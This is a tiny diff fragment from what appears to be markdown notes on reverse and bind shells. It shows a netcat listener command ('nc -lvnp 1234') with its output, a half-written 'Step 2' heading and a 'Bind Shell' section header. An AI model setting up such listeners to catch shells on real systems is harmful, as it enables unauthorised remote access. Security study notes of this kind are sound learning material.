@@ -20,6 +20,7 @@ We being by setting up a [[netcat]] listener on a port of our choosing:
 $ nc -lvnp 1234
 listening on [any] 1234 ...
 ```
+#### Step 2: Conne
 
 ---
 ## Bind Shell
